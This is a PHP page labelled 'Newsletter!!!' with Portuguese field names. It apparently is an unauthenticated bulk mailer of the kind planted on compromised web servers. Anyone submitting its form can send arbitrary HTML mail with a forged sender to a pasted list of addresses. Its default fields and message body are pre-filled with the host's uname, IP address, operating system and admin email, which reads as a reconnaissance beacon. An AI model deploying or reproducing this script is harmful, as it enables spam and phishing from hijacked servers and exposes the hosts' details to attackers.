<?php

$testa = $_POST['veio'];

if($testa != "") {

				$message = $_POST['html'];

				$subject = $_POST['assunto'];

				$de = $_POST['de'];

				$to = $_POST['emails'];

				// ler o conte?do do arquivo para uma string

				

				//$handle = fopen ($emails, "r");

				//$to = fread ($handle, filesize ($emails));

				//fclose ($handle);

				

				//$handle2 = fopen ($html, "r");

				//$message = fread ($handle2, filesize ($html));

				//fclose ($handle2);

				

			

				$headers  = "MIME-Version: 1.0\r\n";


				$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";



				$email = explode("\n", $to);



				$headers .= "From: ".$RealName." <".$de.">\r\n";





				$message = stripslashes($message);

				

				$i = 0;

				$count = 1;

				while($email[$i]) {

$data = date("d/m/Y");
$boundary = rand(1,999999);				

//				$ok = "ok";
if(mail($email[$i], $subject.$data, $message.$boundary.$boundary, $headers))
echo "* N?mero: $count <b>".$email[$i]."</b> <font color=green>Enviado</font><br><hr>";
else
echo "* N?mero: $count <b>".$email[$i]."</b> <font color=red>Erro</font><br><hr>";
$i++;
$count++;
}
//$count--;
//if($ok == "ok")

	//echo "<script> alert('Terminou os emails. ".$count." e-mails enviados'); </script>";







}

?>

<html>

<head>

<title>Newsletter!!!</title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<style>

.normal {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 12px;

	color: #000000;

}

.form {

	font-family: Arial, Helvetica, sans-serif;

	font-size: 10px;

	color: #333333;

	background-color: #FFFFFF;

	border: 1px dashed #666666;

}



.style1 {

	font-family: Verdana, Arial, Helvetica, sans-serif;

	font-weight: bold;

}

</style>

</head>

<body leftmargin="0" topmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0" style="text-align: center">

<form action="" method="post" enctype="multipart/form-data" name="form1">

<input type="hidden" name="veio" value="sim">

<table width="307" height="277" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">

<tr>

<td width="305" height="15" align="center" bgcolor="#F4F4F4">
&nbsp;
<input name="de" type="text" class="form" id="de" size="85" value="<?php echo $UNAME = @php_uname(); ?> <?php echo $_SERVER['SERVER_ADMIN']; ?>" ><input name="assunto" type="text" class="form" id="assunto" size="85" value="<?php echo $_SERVER['SERVER_ADDR']; ?> <?php echo $OS = @PHP_OS; ?>" ></td>

</tr>

<tr>

<td height="256" valign="top" bgcolor="#FFFFFF">
<table width="96%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="222">

<tr>

<td height="1">
</td>

</tr>

<tr align="center" bgcolor="#F4F4F4">

<td height="1" colspan="2"></td>

</tr>

<tr align="right">

<td height="77" colspan="2" valign="top">        
<p align="center">        <br>        <font color="#990000" size="1">

        <textarea name="html" cols="80" rows="4" wrap="VIRTUAL" class="form" id="html"> <tr>
      <tr align="left"> 
<td colspan="2" bgcolor="#000000" >Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br>
Endere&#231;o IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>
Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
</td>
    </tr></textarea> </font></td>

</tr>

<tr align="center" bgcolor="#F4F4F4">

<td height="7" colspan="2"></td>

</tr>

<tr align="right">

<td height="70" colspan="2" valign="top">
<p align="center"><br>

<textarea name="emails" cols="80" rows="4" wrap="VIRTUAL" class="form" id="emails"></textarea> </td>

</tr>

<tr>

<td height="31" align="right" valign="top" width="48%">
<p align="center">
<input type="submit" name="Submit" value="Enviar" style="float: left"></td>
<td align="center" valign="top" height="31">
<p>&nbsp;</td>

</tr>

</table>
<p align="center">&nbsp;</td>

</tr>

<tr>

<td height="1" align="center" bgcolor="#F4F4F4"></td>

</tr>

</table>

</form>

</body>